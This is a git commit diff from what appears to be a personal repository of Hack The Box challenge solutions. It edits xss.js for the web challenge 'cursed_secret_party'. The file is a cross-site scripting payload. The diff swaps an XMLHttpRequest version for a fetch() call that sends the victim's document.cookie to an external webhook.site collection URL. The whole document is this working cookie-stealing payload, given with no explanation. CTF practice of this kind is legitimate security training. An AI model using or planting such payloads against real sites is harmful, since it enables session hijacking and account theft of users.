0be42d1a6dbaa1e3d2740285b6bc5df4a926dbea
moldu <moldu@localhost.localdomain>
2023-01-15 18:37:37 +0100

    latest

--- htb/challenges/web/cursed_secret_party/xss.js
+++ htb/challenges/web/cursed_secret_party/xss.js
@@ -1,3 +1,1 @@
-var xhr = new XMLHttpRequest();
-xhr.open("https://webhook.site/e5242b09-a509-4ae2-9ee6-05c93076c22b/?a=" + document.cookie, true);
-xhr.send();
+fetch("https://webhook.site/e5242b09-a509-4ae2-9ee6-05c93076c22b/?a=" + document.cookie);
